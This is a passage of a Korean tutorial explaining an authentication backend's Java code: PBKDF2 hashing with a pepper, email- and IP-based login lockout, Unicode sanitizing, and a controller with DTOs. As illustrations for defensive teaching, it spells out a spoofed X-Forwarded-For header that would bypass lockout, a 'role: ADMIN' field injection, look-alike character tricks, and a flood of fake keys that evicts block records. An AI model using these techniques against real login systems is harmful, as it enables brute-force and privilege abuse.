  private byte[] pbkdf2(CharSequence rawPassword, byte[] salt, int iterations) {
    char[] material = (rawPassword.toString() + properties.getPepper()).toCharArray();  // (1)
    PBEKeySpec spec = new PBEKeySpec(material, salt, iterations, HASH_BYTES * 8);       // (2)
    try {
      return SecretKeyFactory.getInstance(ALGORITHM).generateSecret(spec).getEncoded(); // (3)
    } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
      throw new IllegalStateException("비밀번호 해시를 만들지 못함", e);                   // (4)
    } finally {
      spec.clearPassword();                                                            // (5)
      Arrays.fill(material, '\0');
    }
  }
```

1. **pepper 를 비밀번호 뒤에 붙입니다.**

   | | salt | pepper |
   |---|---|---|
   | 값 | 비밀번호마다 다름 | 서버 전체에 하나 |
   | 저장 위치 | DB (해시 안에) | **DB 에 없음** (환경 변수) |
   | 목적 | 같은 비밀번호의 해시를 다르게 | DB 만 털렸을 때 대입 자체를 불가능하게 |

   DB 가 통째로 유출돼도 pepper 를 모르면 `1234` 조차 맞춰 볼 수 없습니다.
   > ⚠️ **대신 pepper 를 잃어버리면 전 회원이 로그인 불가**가 됩니다. DB 백업과 **별도로** 보관해야 합니다.
2. **`HASH_BYTES * 8`** = 32 × 8 = **256**. 이 파라미터는 바이트가 아니라 **비트** 단위라서 8 을 곱합니다. 자주 틀리는 부분입니다.
3. 여기서 21만 번 반복이 실제로 돕니다. 수십~수백 밀리초가 걸립니다.
4. **예외는 "이 JVM 에 알고리즘이 없다" 같은 환경 문제**입니다. 조용히 `false` 로 넘기면 안 되고 터뜨리는 게 맞습니다. `e` 를 같이 넘겨서 **원래 원인이 로그에 남게** 합니다.
5. **`finally`** 는 성공하든 예외가 나든 **반드시 실행**되는 블록입니다. 여기서 평문 비밀번호를 **0 으로 덮어씁니다.**

   > 왜? 메모리에 평문이 남아 있으면 힙 덤프를 뜨거나 메모리를 훑는 공격에 노출됩니다. `char[]` 를 쓴 이유도 이것입니다 — **`String` 은 불변이라 지울 수가 없습니다.**
   >
   > **솔직한 한계**: (1)번의 `rawPassword.toString() + pepper` 가 중간에 `String` 을 하나 만들기 때문에, 그 `String` 은 GC 될 때까지 힙에 남습니다. 즉 이 지우기는 절반만 유효합니다. 완벽히 하려면 `char[]` 끼리 이어 붙여야 하는데, 지금 단계에서는 과한 작업이라 두었습니다.

#### `parse` — 저장된 해시 쪼개기

```java
  private ParsedHash parse(String encodedPassword) {
    String[] parts = encodedPassword.split("\\" + SEPARATOR);              // (1)

    if (parts.length != 6 || !parts[0].isEmpty() || !PREFIX.equals(parts[1])) {  // (2)
      return null;
    }

    try {
      int version = Integer.parseInt(parts[2]);                            // (3)
      int iterations = Integer.parseInt(parts[3]);
      if (iterations < 1) {
        return null;                                                       // (4)
      }

      byte[] salt = DECODER.decode(parts[4]);
      byte[] hash = DECODER.decode(parts[5]);
      if (salt.length == 0 || hash.length == 0) {
        return null;
      }

      return new ParsedHash(version, iterations, salt, hash);
    } catch (IllegalArgumentException e) {                                 // (5)
      return null;
    }
  }
```

1. **`"\\" + '$'` = `"\$"`.** `$` 를 이스케이프해야 하는 이유는, `split` 이 **정규식**을 받는데 정규식에서 `$` 는 "줄의 끝"이라는 특수 문자이기 때문입니다. 그냥 `split("$")` 하면 의도대로 안 쪼개집니다.
2. **조각이 왜 6개인가** — `"$nanumi$1$210000$salt$hash"` 를 `$` 로 쪼개면 **맨 앞이 빈 문자열**이 됩니다.

   ```
   [0]=""   [1]="nanumi"   [2]="1"   [3]="210000"   [4]=salt   [5]=hash
   ```

   그래서 `parts[0].isEmpty()` 까지 확인합니다.
3. **`Integer.parseInt`** — 문자열을 숫자로. 숫자가 아니면 예외가 납니다.
4. `iterations < 1`, `length == 0` 검사는 **`PBEKeySpec` 이 그런 값으로 예외를 던지기 때문에** 미리 막는 것입니다.
5. **`catch (IllegalArgumentException)` 하나로 두 가지를 다 잡습니다.**
   - `Integer.parseInt` 실패 (`NumberFormatException` 은 `IllegalArgumentException` 의 자식입니다)
   - Base64 디코딩 실패

**전부 `null` 을 돌려주는 게 핵심입니다.** 예외를 밖으로 던지지 않으므로, DB 에 쓰레기 값이 들어 있어도 서버가 500 으로 죽지 않고 그냥 "로그인 실패"가 됩니다.

```java
  private record ParsedHash(int version, int iterations, byte[] salt, byte[] hash) {}
```

쪼갠 결과 4개를 담아 나르는 작은 묶음입니다. `record` 라서 `parsed.salt()` 같은 getter 가 자동으로 생기고, `private` 이라 이 클래스 밖에서는 존재조차 보이지 않습니다.

---

### 3-10. `LoginAttemptService.java` — 비밀번호 찍기 막기

#### 무엇을 막나

비밀번호를 계속 바꿔 가며 찍어 보는 공격(무차별 대입)을 막습니다. 아무리 해싱을 느리게 해도, **시도 자체를 무제한으로 허용하면** 결국 뚫립니다.

#### 카운터가 두 개인 이유

```java
  private static final int EMAIL_MAX_ATTEMPTS = 5;                        // (1)
  private static final int IP_MAX_ATTEMPTS = 20;                          // (2)

  private static final Duration BLOCK_DURATION = Duration.ofMinutes(10);  // (3)
  private static final Duration ATTEMPT_TTL = Duration.ofMinutes(30);     // (4)
  private static final int MAX_ENTRIES = 10_000;                          // (5)

  private final Counter emailCounter = new Counter(EMAIL_MAX_ATTEMPTS);
  private final Counter ipCounter = new Counter(IP_MAX_ATTEMPTS);
  private final Clock clock;                                              // (6)
```

**"이메일+IP"를 한 키로 묶으면 안 되나요?** — 안 됩니다. **IP 만 바꾸면 카운터가 새로 시작**해서 정작 막고 싶던 공격을 못 막습니다. 그래서 둘로 나누고, **둘 중 하나라도 걸리면 차단**합니다.

1. **이메일 단위 5회** — 계정 하나를 노리고 비밀번호를 바꿔 가며 찌르는 것을 막습니다. 임계값을 낮게 둡니다.
2. **IP 단위 20회** — 한 회선에서 계정을 바꿔 가며 찌르는 것을 막습니다.
   > 아파트는 **공유기를 여러 세대가 같이 쓰는 경우**가 있어서, 같은 IP 로 여러 사람이 들어옵니다. 그래서 넉넉히 둡니다.
3. **차단 시간 10분.**
4. **기록 유효 기간 30분** — 3번 틀리고 한참 뒤에 다시 시도하면, 그건 공격이 아니라 그냥 잊어버린 사람입니다. **처음부터 다시 셉니다.**
5. **카운터 하나가 들고 있을 수 있는 최대 항목 수.**
   > 상한이 없으면 **키를 계속 바꿔 가며 요청하는 것만으로 서버 메모리를 고갈시킬 수 있습니다.** 존재하지 않는 이메일로 계속 로그인 시도하면 항목이 무한정 쌓입니다.
6. **`Clock`** — 시계를 필드로 들고 있습니다. 이유는 바로 아래.

#### 생성자가 두 개인 이유

```java
  public LoginAttemptService() {
    this(Clock.systemDefaultZone());                                      // (1)
  }

  LoginAttemptService(Clock clock) {                                      // (2)
    this.clock = clock;
  }
```

1. **평소에 쓰는 생성자.** 실제 시계를 씁니다. `this(...)` 는 "같은 클래스의 다른 생성자를 부른다"는 뜻입니다.
2. **테스트 전용 생성자.** `public` 이 없습니다(package-private) — **같은 패키지에서만** 부를 수 있어서, 테스트 코드만 쓸 수 있습니다.

   > **왜 이렇게 하나**: "10분 뒤에 차단이 풀리는가"를 테스트하려면 어떻게 할까요? `Thread.sleep(600000)` 으로 10분을 기다릴 수는 없습니다. 대신 **가짜 시계**를 넣어서 "지금은 10분 뒤"라고 말해 주면 즉시 확인할 수 있습니다.
   > 이렇게 **바깥 세계(시간, 파일, 네트워크)를 밖에서 넣어 주는 것**을 의존성 주입이라 하고, 테스트하기 좋은 코드의 핵심 기법입니다.

#### 바깥에 열어 둔 메서드들

```java
  public void checkBlocked(String email, String clientIp) {
    if (isBlocked(email, clientIp)) {
      throw new CustomException(ErrorCode.LOGIN_ATTEMPT_EXCEEDED);         // (1)
    }
  }

  public boolean isBlocked(String email, String clientIp) {
    Instant now = clock.instant();                                        // (2)

    boolean emailBlocked = emailCounter.isBlocked(normalize(email), now);  // (3)
    boolean ipBlocked = ipCounter.isBlocked(normalize(clientIp), now);

    return emailBlocked || ipBlocked;
  }
```

1. 막혀 있으면 **비밀번호를 맞춰 보기도 전에** 예외를 던집니다 → 429.
2. **`clock.instant()`** — 지금 시각. 진짜 시계일 수도, 테스트용 가짜 시계일 수도 있습니다.
3. **단축 평가를 일부러 피했습니다.**

   > `return emailCounter.isBlocked(...) || ipCounter.isBlocked(...)` 로 적으면, 앞이 참일 때 **뒤를 아예 실행하지 않습니다**(단축 평가). 그런데 `isBlocked` 안에는 **지나간 기록을 정리하는 코드**가 들어 있어서, 실행되지 않으면 IP 쪽 낡은 기록이 계속 남습니다.
   > 그래서 변수 두 개에 각각 담아 **양쪽을 반드시 실행**시킵니다.

```java
  public void recordFailure(String email, String clientIp) {
    Instant now = clock.instant();
    emailCounter.recordFailure(normalize(email), now);                    // 둘 다 올림
    ipCounter.recordFailure(normalize(clientIp), now);
  }

  public void recordSuccess(String email, String clientIp) {
    emailCounter.clear(normalize(email));                                 // (1)
  }
```

1. **성공하면 이메일 카운터만 지웁니다. IP 쪽은 남겨 둡니다.**

   > 왜? 공격자가 **자기 계정 하나로 성공**한 뒤, 같은 IP 에서 남의 계정을 계속 찔러 보는 걸 막아야 하기 때문입니다. IP 카운터까지 지워 주면 그 방어가 무력화됩니다.
   >
   > 🔎 **부작용이 하나 있습니다**: 아파트 공유기처럼 여러 사람이 한 IP 를 쓰면, 성공해도 IP 카운터가 안 줄어서 **선의의 이웃들이 20회를 채워 잠길 수 있습니다.** 다만 30분이 지나면 기록이 사라지므로 영구적이지는 않습니다.

```java
  private String normalize(String key) {
    return key == null ? "" : key.trim().toLowerCase(Locale.ROOT);         // (1)
  }
```

1. **삼항 연산자** `조건 ? 참일때 : 거짓일때`. `null` 이면 빈 문자열, 아니면 앞뒤 공백을 떼고 소문자로 맞춥니다.
   **`Test@a.com`** 과 **`test@a.com`** 을 **같은 키로** 세기 위해서입니다. 안 그러면 대소문자만 바꿔 가며 카운터를 피할 수 있습니다.
   > **`Locale.ROOT`** 를 지정하는 이유: 터키어 환경에서는 `I` 를 소문자로 바꾸면 `i` 가 아니라 `ı`(점 없는 i)가 됩니다. 서버 설정에 따라 동작이 달라지는 걸 막으려고 **언어 중립 기준**을 지정합니다.

#### 내부 클래스 `Counter`

```java
  private static final class Counter {                                    // (1)

    private final int maxAttempts;
    private final Map<String, Attempt> attempts = createBoundedMap();      // (2)
```

1. **중첩 클래스.** 이 클래스 안에서만 쓰이므로 밖으로 꺼내지 않았습니다. `static` 이라 바깥 객체와 독립적이고, `final` 이라 상속할 수 없습니다.
2. **`Map<String, Attempt>`** — "키 → 값" 짝을 담는 자료구조입니다. 여기서는 "이메일 → 실패 기록".

```java
    private boolean isBlocked(String key, Instant now) {
      Attempt attempt = attempts.get(key);
      if (attempt == null) {
        return false;                                                     // (1)
      }

      if (attempt.blockedUntil != null && now.isBefore(attempt.blockedUntil)) {
        return true;                                                      // (2)
      }

      if (isStale(attempt, now)) {
        attempts.remove(key, attempt);                                    // (3)
      }
      return false;
    }
```

1. 기록이 없으면 당연히 안 막힘.
2. **차단 시각이 정해져 있고, 지금이 그 전이면** 막힘.
3. **차단이 풀렸거나 오래 방치된 기록이면 지웁니다.** 그래야 다음부터 처음부터 다시 셉니다. `remove(key, attempt)` 는 **값까지 같을 때만** 지우는 안전한 버전입니다(다른 스레드가 그사이 바꿨으면 안 지움).

```java
    private void recordFailure(String key, Instant now) {
      attempts.compute(                                                   // (1)
          key,
          (ignored, current) -> {
            Attempt attempt = (current == null || isStale(current, now)) ? new Attempt() : current; // (2)
            attempt.failures++;                                           // (3)
            attempt.lastFailureAt = now;
            if (attempt.failures >= maxAttempts) {
              attempt.blockedUntil = now.plus(BLOCK_DURATION);            // (4)
            }
            return attempt;
          });
    }
```

1. **`compute`** — "키를 찾아서, 값을 이렇게 바꿔라"를 **한 번에** 처리합니다.
   > `get` 해서 보고 `put` 하면, 그 사이에 다른 요청이 끼어들어 **하나가 없어질 수 있습니다.** `compute` 는 그 구간을 묶어 줍니다.
2. 기록이 없거나 오래됐으면 새로 시작, 아니면 이어서 셉니다.
3. **`++`** 는 1 증가.
4. **임계값에 닿으면 차단 시각을 정합니다.** `now.plus(10분)`.

```java
    private boolean isStale(Attempt attempt, Instant now) {
      if (attempt.blockedUntil != null) {
        return !now.isBefore(attempt.blockedUntil);                       // (1)
      }
      return attempt.lastFailureAt == null
          || !now.isBefore(attempt.lastFailureAt.plus(ATTEMPT_TTL));      // (2)
    }
```

"이 기록은 이제 버려도 되는가"를 판단합니다.

1. **차단 중이었다면**, 차단 시각이 지났으면 버려도 됨. `!now.isBefore(x)` 는 "now 가 x 보다 앞서지 않다" = **"now >= x"** 입니다.
2. **차단은 아니었다면**, 마지막 실패로부터 30분이 지났으면 버려도 됨.

```java
    private static Map<String, Attempt> createBoundedMap() {
      return Collections.synchronizedMap(                                 // (1)
          new LinkedHashMap<String, Attempt>(64, 0.75f, true) {           // (2)
            @Override
            protected boolean removeEldestEntry(Map.Entry<String, Attempt> eldest) {
              return size() > MAX_ENTRIES;                                // (3)
            }
          });
    }
```

이 짧은 메서드에 세 가지 장치가 들어 있습니다.

1. **`synchronizedMap`** — 여러 요청이 동시에 들어와도 안전하게 감싸 줍니다.
   > 웹 서버는 요청을 **동시에 여러 개** 처리합니다. 보통 `HashMap` 을 여러 스레드가 같이 건드리면 데이터가 깨지거나 무한 루프에 빠질 수 있습니다.
2. **`new LinkedHashMap<>(64, 0.75f, true)`** — 세 번째 `true` 가 핵심입니다. **접근 순서(access order)** 로 정렬하라는 뜻으로, **최근에 쓴 항목이 뒤로** 갑니다.
   > `{ ... }` 로 블록이 이어지는 건 **익명 클래스** 문법입니다. "`LinkedHashMap` 을 만드는데, 메서드 하나만 살짝 바꿔서"라는 뜻입니다.
3. **`removeEldestEntry`** — "가장 오래된 항목을 지울까?"를 묻는 메서드입니다. 상한을 넘으면 참을 돌려줘서, **가장 오래 안 쓴 항목이 자동으로 밀려납니다.** (LRU 캐시)

   > 🔎 **감수한 부분**: 밀려난 자리에 차단 기록이 있었다면 그 키는 다시 처음부터 세게 됩니다. 공격자가 1만 개가 넘는 가짜 키를 만들어 차단 기록을 밀어낼 수 있다는 뜻이지만, **메모리가 무한정 늘어나는 것보다는 낫다**고 보고 택한 절충입니다.

```java
  private static final class Attempt {
    private int failures;                                                 // 실패 횟수
    private Instant lastFailureAt;                                        // 마지막 실패 시각
    private Instant blockedUntil;                                         // 언제까지 막을지
  }
```

기록 하나의 모양입니다. 값만 담는 아주 작은 클래스라 getter 도 없이 필드로만 두었습니다(같은 파일 안에서만 쓰이므로 가능합니다).

> ⚠️ **이 방식의 한계**: 카운터가 **메모리에만** 있습니다.
> - 서버를 재시작하면 기록이 다 사라집니다.
> - 서버를 여러 대로 늘리면 **인스턴스마다 따로 셉니다.** 20대면 사실상 20배까지 시도할 수 있습니다.
>
> 그때는 Redis 같은 공용 저장소로 옮겨야 합니다.

---

### 3-11. `SanitizingStringDeserializer.java` — 들어오는 글자 다듬기

#### 무엇을 막나

눈에 보이지 않거나, 겉보기만 같은 글자로 검사를 피해 가는 걸 막습니다.

```
"ａdmin"   ← 전각 a. 사람 눈엔 admin 이지만 코드가 달라서 중복 검사를 통과함
"ad​min" ← 가운데 폭 0 문자. 화면엔 admin 으로 보임
"  admin  "   ← 앞뒤 공백
```

#### 클래스 선언

```java
public class SanitizingStringDeserializer extends StdScalarDeserializer<String> {  // (1)

  private static final String PASSWORD_MARKER = "password";               // (2)

  private static final char SOFT_HYPHEN = 0x00AD;                         // (3)
  private static final char ZERO_WIDTH_START = 0x200B;
  private static final char ZERO_WIDTH_END = 0x200F;
  private static final char BIDI_START = 0x202A;
  private static final char BIDI_END = 0x202E;
  private static final char WORD_JOINER_START = 0x2060;
  private static final char WORD_JOINER_END = 0x2064;
  private static final char BYTE_ORDER_MARK = 0xFEFF;

  public SanitizingStringDeserializer() {
    super(String.class);                                                  // (4)
  }
```

1. **역직렬화기(deserializer)** — JSON 글자를 자바 값으로 바꾸는 부품입니다. 그 중 "홑값(scalar)"용 뼈대를 물려받습니다.
2. **필드 이름에 `password` 가 들어가면 특별 취급**하기 위한 표시.
3. **보이지 않는 문자들의 코드값**입니다. `0x` 는 16진수라는 표시.
   - `SOFT_HYPHEN` : 줄바꿈 위치를 알려 주는, 보통 안 보이는 하이픈
   - `ZERO_WIDTH_*` : 폭이 0 인 문자들
   - `BIDI_*` : 글자 방향을 뒤집는 문자들 (`abc` 를 `cba` 로 보이게 할 수 있음)
   - `BYTE_ORDER_MARK` : 파일 맨 앞에 붙는 보이지 않는 표식
4. **`super(...)`** — 부모 클래스의 생성자를 부릅니다. "나는 `String` 을 다루는 역직렬화기"라고 알려 주는 것입니다.

#### 실제 동작

```java
  @Override
  public String deserialize(JsonParser parser, DeserializationContext context) {
    String value = parser.getValueAsString();                             // (1)
    if (value == null) {
      return null;
    }
    return sanitize(value, parser.currentName());                         // (2)
  }

  public String sanitize(String value, String fieldName) {                // (3)
    if (value == null) {
      return null;
    }

    String normalized = Normalizer.normalize(value, Normalizer.Form.NFKC); // (4)
    String stripped = removeInvisible(normalized);                         // (5)

    return isPasswordField(fieldName) ? stripped : stripped.strip();       // (6)
  }
```

1. JSON 에서 읽은 원래 값.
2. **`parser.currentName()`** — 지금 읽고 있는 필드 이름(`"email"`, `"password"` 등).
3. **`public` 으로 열어 둔 이유**: 테스트에서 JSON 을 만들지 않고 이 메서드만 바로 부를 수 있게 하려고입니다.
4. **NFKC 정규화** — 겉보기가 같은 글자를 **한 가지 코드로 통일**합니다.
   ```
   "ａdmin"(전각) → "admin"
   "①"           → "1"
   "㈜"          → "(주)"
   ```
5. 보이지 않는 문자를 제거합니다.
6. **비밀번호가 아닐 때만 앞뒤 공백을 뗍니다.**

   > **비밀번호는 왜 안 떼나요?** 회원이 비밀번호 끝에 공백을 넣어서 정했다면, 그것도 비밀번호의 일부입니다. 가입할 때는 떼고 저장했는데 로그인할 때는 안 떼면 **영영 로그인이 안 됩니다.** 어느 쪽이든 **일관되기만 하면** 되는데, 안전한 쪽은 "건드리지 않는 것"입니다.

```java
  private boolean isPasswordField(String fieldName) {
    return fieldName != null && fieldName.toLowerCase(Locale.ROOT).contains(PASSWORD_MARKER);
  }
```

`password`, `newPassword`, `passwordConfirm` 처럼 **이름에 `password` 가 들어가면** 전부 해당됩니다. 나중에 비밀번호 재확인 필드를 추가해도 자동으로 적용됩니다.

```java
  private String removeInvisible(String value) {
    StringBuilder cleaned = new StringBuilder(value.length());             // (1)
    for (int i = 0; i < value.length(); i++) {                            // (2)
      char c = value.charAt(i);
      if (isInvisible(c)) {
        continue;                                                         // (3)
      }
      cleaned.append(c);
    }
    return cleaned.toString();
  }
```

1. **`StringBuilder`** — 글자를 하나씩 붙일 때 씁니다. 처음 크기를 원본 길이로 잡아 두면 중간에 늘리는 비용을 아낍니다.
2. **글자를 처음부터 끝까지 하나씩** 봅니다.
3. **`continue`** — 나머지를 건너뛰고 다음 글자로. 즉 **이 글자는 결과에 안 넣습니다.**

```java
  private boolean isInvisible(char c) {
    if (Character.isISOControl(c)) {                                      // (1)
      return true;
    }
    return c == SOFT_HYPHEN
        || (c >= ZERO_WIDTH_START && c <= ZERO_WIDTH_END)                 // (2)
        || (c >= BIDI_START && c <= BIDI_END)
        || (c >= WORD_JOINER_START && c <= WORD_JOINER_END)
        || c == BYTE_ORDER_MARK;
  }
```

1. **제어문자** — 줄바꿈(`\n`), 탭(`\t`), 널(`\0`) 등. **줄바꿈과 탭도 함께 지웁니다.**
   > 지금 받는 값 중에 여러 줄을 쓰는 항목이 없고, `@SafeText` 도 제어문자를 거절하므로 기준을 맞춰 뒀습니다.
2. **범위 검사** — `0x200B` 부터 `0x200F` 까지처럼 연속된 구간을 한 번에 봅니다.

> **이 부품의 좋은 점**: `JacksonConfig` 에 한 번 등록해 두면 **요청 본문의 모든 문자열**에 자동 적용됩니다. DTO 를 새로 만들어도, 필드를 추가해도 빠뜨릴 일이 없습니다. 검증(`@SafeText` 등)보다 **먼저** 돌기 때문에, 검증기들은 이미 깨끗해진 값만 보게 됩니다.

---
### 3-12. `AuthController.java` — 요청을 받는 입구

**컨트롤러는 얇아야 합니다.** 여기서 하는 일은 "받아서 서비스에 넘기고, 상태 코드를 정해서 돌려주는 것"뿐입니다. 판단은 전부 서비스가 합니다.

```java
@RestController                                                           // (1)
@RequestMapping("/api/auth")                                              // (2)
@RequiredArgsConstructor
public class AuthController {

  private final AuthService authService;                                  // (3)
```

1. **`@RestController`** = `@Controller` + `@ResponseBody`
   - `@Controller` : "이 클래스가 요청을 받는다"
   - `@ResponseBody` : **돌려주는 객체를 JSON 으로 바꿔서** 본문에 담는다
   (`@ResponseBody` 가 없으면 스프링이 "화면 이름"으로 해석해서 HTML 파일을 찾으러 갑니다)
2. **`@RequestMapping("/api/auth")`** — 이 클래스의 모든 메서드 주소 앞에 붙는 공통 경로.
3. **`final` + `@RequiredArgsConstructor`** 조합이 이 프로젝트의 주입 방식입니다.
   > **왜 `@Autowired` 를 필드에 안 붙이나요?** 생성자 주입이 더 낫기 때문입니다.
   > - `final` 을 쓸 수 있어서 **중간에 바뀔 수 없음**
   > - 필요한 것이 생성자에 다 드러나서 **의존 관계가 한눈에 보임**
   > - 테스트에서 `new AuthController(가짜서비스)` 로 바로 만들 수 있음

#### 회원가입

```java
  @PostMapping("/signup")                                                 // (1)
  public ResponseEntity<SignupResponse> signup(@Valid @RequestBody SignupRequest request) { // (2)(3)
    return ResponseEntity.status(HttpStatus.CREATED).body(authService.signup(request));     // (4)
  }
```

1. **`@PostMapping("/signup")`** — `POST /api/auth/signup` 을 담당. (클래스의 `/api/auth` + 메서드의 `/signup`)
2. **`@RequestBody`** — 요청 본문의 JSON 을 `SignupRequest` 객체로 바꿔서 넣어 달라는 뜻.
3. **`@Valid`** — **이 객체에 붙은 검증 규칙을 실행하라**는 뜻. 이게 없으면 `@ValidEmail` 같은 스티커를 붙여 놔도 **아무 검사도 안 합니다.** 빠뜨리기 쉬운 부분입니다.
   실패하면 `MethodArgumentNotValidException` 이 나고, [`GlobalExceptionHandler`](#3-18-예외-처리--오류를-한-모양으로) 가 400 으로 바꿔 줍니다.
4. **`ResponseEntity`** — 상태 코드·헤더·본문을 직접 정할 수 있는 응답 상자입니다.
   **`CREATED`(201)** 를 쓰는 이유: "요청은 성공했고(200), 게다가 **새 자원이 만들어졌다**"를 더 정확히 알리기 위해서입니다.

#### 로그인

```java
  @PostMapping("/login")
  public ResponseEntity<LoginResponse> login(
      @Valid @RequestBody LoginRequest request, HttpServletRequest servletRequest) {  // (1)
    return ResponseEntity.ok(authService.login(request, resolveClientIp(servletRequest))); // (2)
  }
```

1. **`HttpServletRequest`** — 요청의 원본입니다. 여기서 **접속한 IP** 를 꺼내려고 받습니다. 파라미터에 적기만 하면 스프링이 알아서 넣어 줍니다.
2. **`ResponseEntity.ok(...)`** — 200 으로 돌려주는 짧은 표현.

#### 나머지 셋

```java
  @PostMapping("/refresh")
  public ResponseEntity<TokenResponse> refresh(@Valid @RequestBody RefreshRequest request) {
    return ResponseEntity.ok(authService.refresh(request));
  }

  @PostMapping("/logout")
  public ResponseEntity<LogoutResponse> logout(@AuthenticationPrincipal Long userId) {   // (1)
    return ResponseEntity.ok(authService.logout(userId));
  }

  @PostMapping("/withdrawal")
  public ResponseEntity<WithdrawalResponse> withdraw(
      @AuthenticationPrincipal Long userId, @Valid @RequestBody WithdrawalRequest request) {
    return ResponseEntity.ok(authService.withdraw(userId, request));
  }
```

1. **`@AuthenticationPrincipal Long userId`** — 이 한 줄이 이 프로젝트 인증의 결말입니다.

   ```
   JwtAuthenticationFilter 가
     new UsernamePasswordAuthenticationToken(userId, null, emptyList())
   를 SecurityContextHolder 에 담아 뒀고,
   그 첫 번째 값(principal)이 여기로 그대로 나옵니다.
   ```

   **로그인이 안 됐다면 여기까지 오지도 못합니다.** `SecurityConfig` 의 `anyRequest().authenticated()` 가 먼저 401 로 끊기 때문입니다. 그래서 컨트롤러에서 `userId == null` 을 검사할 필요가 없습니다.

#### IP 알아내기

```java
  private String resolveClientIp(HttpServletRequest request) {
    return request.getRemoteAddr();                                       // (1)
  }
```

1. **실제로 연결을 맺은 주소만 씁니다.**

> **`X-Forwarded-For` 헤더를 읽지 않는 이유** (중요)
>
> 프록시나 로드밸런서 뒤에 서버를 두면, `getRemoteAddr()` 은 프록시의 IP 를 돌려줍니다. 그래서 흔히 `X-Forwarded-For` 헤더를 읽어서 진짜 IP 를 알아냅니다.
>
> **그런데 그 헤더는 요청하는 쪽에서 마음대로 지어낼 수 있습니다.**
> ```
> X-Forwarded-For: 1.2.3.4     ← 아무 값이나 적어 보낼 수 있음
> ```
> 그대로 믿으면 **값만 바꿔 가며 보내는 것으로 로그인 잠금을 무한히 통과**할 수 있습니다. IP 카운터가 무의미해집니다.
>
> 프록시 뒤에 둘 때의 올바른 방법은 `application.yml` 의 **`server.forward-headers-strategy`** 를 켜는 것입니다. 그러면 스프링이 헤더를 반영해 `getRemoteAddr()` **자체를** 바꿔 줍니다.
> 단, **프록시가 바깥에서 들어온 헤더를 지워 준다는 전제**가 있어야 합니다. 그 보장이 없으면 켜는 순간 위의 우회가 가능해지므로, 기본값은 `none` 으로 꺼 뒀습니다.
>
> 🔎 **반대쪽 위험**: 프록시 뒤인데 이 설정을 끄면 **모든 요청의 IP 가 프록시 하나로 보입니다.** 그러면 `IP_MAX_ATTEMPTS = 20` 에 금방 닿아서 **전체 서비스가 잠깁니다.** 배포 환경이 정해지면 이 설정을 반드시 다시 봐야 합니다.

---

### 3-13. DTO — 주고받는 데이터의 모양

#### DTO 가 뭔가요

**Data Transfer Object** — "데이터를 나르는 객체"입니다. 요청으로 받는 모양, 응답으로 주는 모양을 클래스로 적어 둔 것입니다.

**엔티티(`User`, `Account`)를 그대로 주고받으면 안 되나요?** 안 됩니다.

| 문제 | 설명 |
|---|---|
| **비밀번호가 새어 나감** | `Account` 를 그대로 응답에 담으면 해시가 JSON 에 포함됩니다 |
| **DB 구조가 밖에 드러남** | 나중에 컬럼 이름을 바꾸면 프런트가 깨집니다 |
| **원치 않는 값이 들어옴** | 요청에 `"role": "ADMIN"` 을 끼워 넣으면 그대로 들어갈 수 있습니다 |

그래서 **경계에서 모양을 갈아탑니다.**

#### `record` 문법

```java
public record LoginResponse(String accessToken, String refreshToken, UserResponse user) { }
```

이 한 줄이 자동으로 만들어 주는 것:

- 필드 3개 (전부 `private final`)
- 생성자 `new LoginResponse(a, b, c)`
- getter — 단, 이름이 `getAccessToken()` 이 아니라 **`accessToken()`** 입니다
- `equals`, `hashCode`, `toString`

**값이 바뀌지 않는(불변) 데이터 묶음**에 딱 맞습니다. 만든 뒤에는 아무도 못 바꾸므로, 여러 곳을 돌아다녀도 안전합니다.

#### 요청 DTO 4개

**`SignupRequest`**

```java
public record SignupRequest(
    @ValidEmail String email,                                             // (1)
    @ValidPassword String password,

    // 비밀번호 재확인 변수도 나중에 만들어야 함                              // (2)

    @NotBlank(message = "닉네임을 입력해 주세요.") @SafeText @ValidNickname String nickname, // (3)
    @NotBlank(message = "아파트명을 입력해 주세요.") @SafeText
        @Size(max = 100, message = "아파트명은 100자 이하여야 합니다.") String aptName,
    @SafeText @Size(max = 20, message = "동은 20자 이하여야 합니다.") String dong,          // (4)
    @SafeText @Size(max = 20, message = "호는 20자 이하여야 합니다.") String ho) {}
```

1. **`@NotBlank` 가 없습니다.** 이메일과 비밀번호는 **검증기가 비어 있는 경우까지 직접 처리**하기 때문입니다. 같이 붙이면 "이메일을 입력해 주세요"가 두 번 나옵니다.
2. 아직 안 만든 기능의 메모입니다.
3. **스티커를 여러 개 붙일 수 있고, 전부 검사합니다.**
   - `@NotBlank` : 비어 있지 않은가
   - `@SafeText` : 스크립트가 될 만한 글자가 없는가
   - `@ValidNickname` : 2~10자 한글/영문/숫자인가
4. **동·호는 `@NotBlank` 가 없습니다** — 선택 입력이라 비워도 됩니다.

**`LoginRequest`**

```java
public record LoginRequest(
    @NotBlank(message = "이메일을 입력해 주세요.") @Size(max = 100, ...) String email,
    @NotBlank(message = "비밀번호를 입력해 주세요.") @Size(max = 20, ...) String password) {}
```

**여기엔 `@ValidEmail`, `@ValidPassword` 가 없습니다.** 일부러 그렇게 했습니다.

> **이유 1**: 비밀번호 규칙은 **나중에 바뀔 수 있습니다.** 예전 규칙으로 가입한 회원이 "형식이 틀렸다"며 로그인조차 못 하면 안 됩니다.
> **이유 2**: "비밀번호는 8자 이상이어야 합니다" 같은 메시지는 **공격자에게 규칙을 알려 주는 힌트**가 됩니다.
>
> **그런데 길이 상한은 둡니다.** 상한이 없으면 수 MB 짜리 문자열을 보내는 것만으로 유니코드 정규화와 PBKDF2 21만 번을 그대로 돌리게 되어, 요청 몇 개로 서버를 마비시킬 수 있습니다.

> ✅ **가입과 로그인의 상한이 달랐던 문제는 해결했습니다.**
>
> | | 허용 길이 | 근거 |
> |---|---|---|
> | 가입 (`SignupRequest`) | **8~20자** | `PasswordValidator.MAX_LENGTH = 20` |
> | 로그인 (`LoginRequest`) | **~20자** | `@Size(max = PasswordValidator.MAX_LENGTH)` |
> | 탈퇴 (`WithdrawalRequest`) | 제한 없음 | `@NotBlank` 만 있음 |
>
> 예전에는 가입 상한이 64자, 로그인 상한이 20자여서 **21~64자 비밀번호로 가입하면 그 계정은 영영 로그인할 수 없었습니다**(비밀번호 변경 기능이 아직 없어서 탈퇴만 가능).
>
> 상한을 **20자로 통일**하고, 값을 `PasswordValidator.MAX_LENGTH` 한 곳에만 두어 `LoginRequest` 가 그 상수를 참조하도록 바꿨습니다. 이제 두 값이 구조적으로 어긋날 수 없습니다. 프런트 `authSchema.ts` 도 같은 20자입니다.
>
